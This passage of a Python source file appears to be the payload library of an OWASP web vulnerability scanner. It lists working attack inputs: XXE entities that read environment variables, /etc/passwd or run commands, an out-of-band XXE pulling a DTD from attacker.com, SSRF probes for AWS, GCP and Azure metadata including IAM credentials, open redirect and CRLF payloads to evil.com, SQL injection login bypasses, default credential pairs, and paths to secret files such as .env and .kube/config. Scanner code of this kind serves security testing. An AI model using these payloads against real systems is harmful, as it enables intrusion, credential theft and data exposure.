<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
<root><data>&xxe;</data></root>""",
            OWASPCategory.A03_INJECTION, InjectionType.XXE,
            expect_regex=r"PATH=", description="XXE - environment variables"),
    Payload("""<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY file SYSTEM "file:///C:/Windows/win.ini">]>
<data>&file;</data>""",
            OWASPCategory.A03_INJECTION, InjectionType.XXE,
            expect_regex=r"\[fonts\]", description="XXE - Windows win.ini"),
    Payload("""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<foo></foo>""",
            OWASPCategory.A03_INJECTION, InjectionType.XXE,
            severity=Severity.CRITICAL, description="Out-of-band XXE via external DTD"),
    Payload("""<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">%init;]>
<foo/>""",
            OWASPCategory.A03_INJECTION, InjectionType.XXE,
            bypass=True, description="XXE via data: URI"),
    Payload("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>
<root><data>&xxe;</data></root>""",
            OWASPCategory.A03_INJECTION, InjectionType.XXE,
            description="XXE + SSRF (localhost probe)"),
    Payload("""<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY bar SYSTEM "expect://id">]>
<foo>&bar;</foo>""",
            OWASPCategory.A03_INJECTION, InjectionType.XXE,
            expect_regex=r"uid=", severity=Severity.CRITICAL,
            description="XXE via PHP expect:// RCE"),
]

# ─────────────────────────────────────────────────────────────────────────────
# A10 — SSRF PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

SSRF_PAYLOADS: List[Payload] = [
    Payload("http://127.0.0.1/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            description="Localhost HTTP probe"),
    Payload("http://localhost/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            description="Localhost name probe"),
    Payload("http://0.0.0.0/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            description="All-interfaces probe"),
    Payload("http://127.0.0.1:22/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            expect_regex=r"SSH", description="Internal SSH service probe"),
    Payload("http://127.0.0.1:8080/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            description="Internal port 8080 probe"),
    Payload("http://127.0.0.1:3306/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            expect_regex=r"(mysql|MySQL)", description="MySQL internal probe"),
    Payload("http://127.0.0.1:6379/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            expect_regex=r"(PONG|redis)", description="Redis internal probe"),
    Payload("http://169.254.169.254/latest/meta-data/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            severity=Severity.CRITICAL, expect_regex=r"(ami-id|hostname|local-ipv4)",
            description="AWS EC2 metadata service"),
    Payload("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            OWASPCategory.A10_SSRF, InjectionType.SSRF,
            severity=Severity.CRITICAL, description="AWS IAM credentials"),
    Payload("http://169.254.169.254/computeMetadata/v1/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            severity=Severity.CRITICAL, description="GCP metadata service"),
    Payload("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            OWASPCategory.A10_SSRF, InjectionType.SSRF,
            severity=Severity.CRITICAL, description="Azure IMDS metadata"),
    Payload("http://100.100.100.200/latest/meta-data/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            description="Alibaba Cloud metadata"),
    Payload("file:///etc/passwd", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            expect_regex=r"root:x:", severity=Severity.CRITICAL, description="SSRF via file:// URI"),
    Payload("dict://127.0.0.1:11211/stats", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            description="Memcached via dict:// probe"),
    Payload("gopher://127.0.0.1:6379/_PING%0D%0A", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            description="Redis via gopher:// SSRF"),
    # Bypass variants
    Payload("http://[::1]/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            bypass=True, description="IPv6 localhost bypass"),
    Payload("http://2130706433/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            bypass=True, description="Integer representation of 127.0.0.1"),
    Payload("http://0x7f000001/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            bypass=True, description="Hex representation of 127.0.0.1"),
    Payload("http://localtest.me/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            bypass=True, description="DNS resolves to 127.0.0.1"),
    Payload("http://127.1/", OWASPCategory.A10_SSRF, InjectionType.SSRF,
            bypass=True, description="Short-form localhost IP"),
]

# ─────────────────────────────────────────────────────────────────────────────
# A01 — BROKEN ACCESS CONTROL (IDOR + Open Redirect)
# ─────────────────────────────────────────────────────────────────────────────

OPEN_REDIRECT_PAYLOADS: List[Payload] = [
    Payload("https://evil.com", OWASPCategory.A01_BROKEN_ACCESS_CONTROL, InjectionType.OPEN_REDIRECT,
            expect_regex=r"evil\.com", description="Direct URL redirect"),
    Payload("//evil.com", OWASPCategory.A01_BROKEN_ACCESS_CONTROL, InjectionType.OPEN_REDIRECT,
            expect_regex=r"evil\.com", description="Protocol-relative redirect"),
    Payload("/\\evil.com", OWASPCategory.A01_BROKEN_ACCESS_CONTROL, InjectionType.OPEN_REDIRECT,
            description="Backslash redirect bypass"),
    Payload("/%09/evil.com", OWASPCategory.A01_BROKEN_ACCESS_CONTROL, InjectionType.OPEN_REDIRECT,
            bypass=True, description="Tab character bypass"),
    Payload("/%2F/evil.com", OWASPCategory.A01_BROKEN_ACCESS_CONTROL, InjectionType.OPEN_REDIRECT,
            bypass=True, description="Encoded slash bypass"),
    Payload("http:evil.com", OWASPCategory.A01_BROKEN_ACCESS_CONTROL, InjectionType.OPEN_REDIRECT,
            description="Colon-only scheme"),
    Payload("https://attacker.com?legitimate.com", OWASPCategory.A01_BROKEN_ACCESS_CONTROL, InjectionType.OPEN_REDIRECT,
            bypass=True, description="Query parameter confusion"),
    Payload("javascript:window.location='https://evil.com'", OWASPCategory.A01_BROKEN_ACCESS_CONTROL, InjectionType.OPEN_REDIRECT,
            description="javascript: redirect"),
    Payload("%0d%0aLocation: https://evil.com", OWASPCategory.A01_BROKEN_ACCESS_CONTROL, InjectionType.HEADER_INJECTION,
            expect_regex=r"Location:", description="HTTP Response Splitting (CRLF)"),
    Payload("%0aSet-Cookie: session=evil", OWASPCategory.A01_BROKEN_ACCESS_CONTROL, InjectionType.HEADER_INJECTION,
            description="Cookie injection via CRLF"),
]

IDOR_PATHS: List[str] = [
    "/api/user/1", "/api/user/2", "/api/user/0", "/api/users/1/profile",
    "/api/account/1", "/api/orders/1", "/api/admin", "/api/admin/users",
    "/user/1/settings", "/user/2/settings", "/account/1/delete",
    "/api/v1/user/1", "/api/v1/admin", "/api/v1/users",
    "/admin", "/admin/", "/administrator", "/admin.php", "/admin/login",
    "/dashboard", "/control-panel", "/manage", "/management",
    "/api/internal", "/api/private", "/.git/config", "/.env",
    "/config.php", "/config.js", "/settings.json", "/web.config",
    "/phpinfo.php", "/info.php", "/test.php",
    "/backup", "/backup.zip", "/backup.tar.gz", "/db.sql",
    "/robots.txt", "/sitemap.xml", "/.htaccess", "/server-status",
    "/metrics", "/health", "/status", "/actuator", "/actuator/env",
    "/actuator/dump", "/actuator/trace", "/actuator/beans",
    "/swagger-ui.html", "/api-docs", "/openapi.json",
    "/graphql", "/graphiql", "/__graphql",
]

# ─────────────────────────────────────────────────────────────────────────────
# A05 — SECURITY MISCONFIGURATION
# ─────────────────────────────────────────────────────────────────────────────

SENSITIVE_PATHS: List[str] = [
    # Credential files
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/config.php", "/configuration.php", "/wp-config.php",
    "/config.yml", "/config.yaml", "/application.yml",
    "/database.yml", "/secrets.yml", "/credentials.yml",
    "/settings.py", "/local_settings.py",
    # Version control
    "/.git/config", "/.git/HEAD", "/.git/FETCH_HEAD",
    "/.svn/entries", "/.hg/hgrc",
    # Backup files
    "/index.php~", "/index.php.bak", "/index.php.old",
    "/login.php.bak", "/admin.php.bak",
    "/backup.sql", "/dump.sql", "/database.sql",
    "/backup.zip", "/backup.tar.gz", "/site.zip",
    # Logs
    "/error.log", "/debug.log", "/access.log",
    "/var/log/apache2/error.log", "/logs/error.log",
    # Server info
    "/server-status", "/server-info",
    "/phpinfo.php", "/phpinfo", "/info.php", "/php_info.php",
    "/test.php", "/debug.php", "/trace.php",
    # APIs / Docs
    "/swagger-ui.html", "/swagger-ui/", "/api-docs/",
    "/v1/api-docs", "/v2/api-docs", "/openapi.json",
    "/openapi.yaml", "/api/swagger.json",
    # Spring Boot Actuator
    "/actuator", "/actuator/health", "/actuator/env",
    "/actuator/mappings", "/actuator/beans", "/actuator/dump",
    "/actuator/logfile", "/actuator/configprops",
    "/actuator/httptrace", "/actuator/auditevents",
    # Admin panels
    "/admin", "/admin/", "/admin/login", "/admin/dashboard",
    "/administrator", "/administration",
    "/wp-admin", "/wp-admin/admin.php",
    "/cpanel", "/phpmyadmin", "/pma",
    "/jmx-console", "/web-console", "/invoker/JMXInvokerServlet",
    # Jenkins / CI
    "/jenkins", "/jenkins/script", "/jenkins/credentials",
    "/.circleci/config.yml", "/.travis.yml",
    "/.github/workflows/", "/Jenkinsfile",
    # Kubernetes / Cloud
    "/.kube/config", "/etc/kubernetes/admin.conf",
    "/metadata/v1/", "/metadata/instance",
    # Miscellaneous
    "/robots.txt", "/sitemap.xml",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/RELEASE-NOTES.txt", "/CHANGELOG.md", "/CHANGELOG.txt",
    "/README.md", "/README.txt",
]

SECURITY_HEADERS: List[str] = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Permissions-Policy",
    "X-XSS-Protection",
    "Cross-Origin-Embedder-Policy",
    "Cross-Origin-Opener-Policy",
    "Cross-Origin-Resource-Policy",
    "Cache-Control",
]

DANGEROUS_RESPONSE_HEADERS: Dict[str, List[str]] = {
    "Server": ["Apache/", "nginx/", "IIS/", "PHP/", "Jetty/", "Tomcat/", "gunicorn/"],
    "X-Powered-By": ["PHP/", "ASP.NET", "Express", "JSF"],
    "X-AspNet-Version": [],
    "X-AspNetMvc-Version": [],
}

# ─────────────────────────────────────────────────────────────────────────────
# A07 — BROKEN AUTHENTICATION
# ─────────────────────────────────────────────────────────────────────────────

DEFAULT_CREDENTIALS: List[Dict[str, str]] = [
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "password"},
    {"username": "admin", "password": "admin123"},
    {"username": "admin", "password": "123456"},
    {"username": "admin", "password": "password123"},
    {"username": "admin", "password": "letmein"},
    {"username": "admin", "password": "welcome"},
    {"username": "admin", "password": "administrator"},
    {"username": "admin", "password": "qwerty"},
    {"username": "admin", "password": "abc123"},
    {"username": "administrator", "password": "administrator"},
    {"username": "administrator", "password": "password"},
    {"username": "root", "password": "root"},
    {"username": "root", "password": "toor"},
    {"username": "root", "password": "password"},
    {"username": "user", "password": "user"},
    {"username": "user", "password": "password"},
    {"username": "guest", "password": "guest"},
    {"username": "test", "password": "test"},
    {"username": "demo", "password": "demo"},
    {"username": "superuser", "password": "superuser"},
    {"username": "sa", "password": "sa"},             # SQL Server
    {"username": "postgres", "password": "postgres"}, # PostgreSQL
    {"username": "oracle", "password": "oracle"},     # Oracle
    {"username": "tomcat", "password": "tomcat"},     # Tomcat
    {"username": "jenkins", "password": "jenkins"},   # Jenkins
    {"username": "admin", "password": ""},            # Empty password
    {"username": "", "password": ""},
]

AUTH_BYPASS_PAYLOADS: List[Payload] = [
    Payload("' OR '1'='1'--", OWASPCategory.A07_AUTH_FAILURES, InjectionType.SQL_ERROR,
            description="SQLi auth bypass"),
    Payload("admin'--", OWASPCategory.A07_AUTH_FAILURES, InjectionType.SQL_ERROR,
            description="Comment auth bypass"),
    Payload("' OR 1=1--", OWASPCategory.A07_AUTH_FAILURES, InjectionType.SQL_ERROR,
            description="Numeric tautology bypass"),
    Payload("' OR 'x'='x", OWASPCategory.A07_AUTH_FAILURES, InjectionType.SQL_ERROR,
            description="String tautology bypass"),
    Payload("') OR ('1'='1", OWASPCategory.A07_AUTH_FAILURES, InjectionType.SQL_ERROR,
            description="Parenthesis tautology"),
    Payload("' OR 1=1#", OWASPCategory.A07_AUTH_FAILURES, InjectionType.SQL_ERROR,
            description="Hash comment bypass"),
    Payload('" OR "1"="1', OWASPCategory.A07_AUTH_FAILURES, InjectionType.SQL_ERROR,
            description="Double quote tautology"),
    Payload("' UNION SELECT 1,'admin','admin'--", OWASPCategory.A07_AUTH_FAILURES, InjectionType.SQL_UNION,
            description="UNION-based auth bypass"),
]

# ─────────────────────────────────────────────────────────────────────────────
# A02 — CRYPTOGRAPHIC FAILURES
# ─────────────────────────────────────────────────────────────────────────────

WEAK_CRYPTO_INDICATORS: Dict[str, List[str]] = {
    "cookie_flags": ["Secure", "HttpOnly", "SameSite"],
    "hashing_patterns": [
        r"[a-f0-9]{32}",    # MD5
        r"[a-f0-9]{40}",    # SHA1
        r"[a-zA-Z0-9+/]{24}={0,2}",  # Base64 (suspicious if looks like password)
    ],
    "jwt_pattern": r"eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+",
    "weak_jwt_algos": ["none", "HS256"],
    "weak_tls": ["SSLv2", "SSLv3", "TLSv1.0", "TLSv1.1"],
    "insecure_http_fields": ["password", "passwd", "secret", "token", "api_key", "creditcard"],
}

# ─────────────────────────────────────────────────────────────────────────────
# Payload Library
# ─────────────────────────────────────────────────────────────────────────────

class PayloadLibrary:
    """Aggregated access to all OWASP payloads."""

    def __init__(self):
        self._all: List[Payload] = (
            SQL_ERROR_PAYLOADS +
            SQL_BOOLEAN_PAYLOADS +
            SQL_TIME_PAYLOADS +
            SQL_UNION_PAYLOADS +
            XSS_PAYLOADS +
            SSTI_PAYLOADS +
            CMD_INJECTION_PAYLOADS +
            PATH_TRAVERSAL_PAYLOADS +
            XXE_PAYLOADS +
            SSRF_PAYLOADS +
            OPEN_REDIRECT_PAYLOADS +
            AUTH_BYPASS_PAYLOADS
        )

    @property
    def all(self) -> List[Payload]:
        return self._all

    def by_category(self, cat: OWASPCategory) -> List[Payload]:
        return [p for p in self._all if p.owasp_category == cat]

    def by_type(self, t: InjectionType) -> List[Payload]:
        return [p for p in self._all if p.injection_type == t]

    def by_severity(self, s: Severity) -> List[Payload]:
        return [p for p in self._all if p.severity == s]

    def bypass_only(self) -> List[Payload]:
        return [p for p in self._all if p.bypass]

    def time_based(self) -> List[Payload]:
        return [p for p in self._all if p.time_based]

    def stats(self) -> Dict[str, Any]:
        return {
            "total": len(self._all),
            "by_category": {c.value: len(self.by_category(c)) for c in OWASPCategory},
            "by_severity": {s.value: len(self.by_severity(s)) for s in Severity},
            "bypass_count": len(self.bypass_only()),
            "time_based_count": len(self.time_based()),
        }


_LIBRARY: Optional[PayloadLibrary] = None

def get_library() -> PayloadLibrary:
    global _LIBRARY
    if _LIBRARY is None:
        _LIBRARY = PayloadLibrary()
    return _LIBRARY
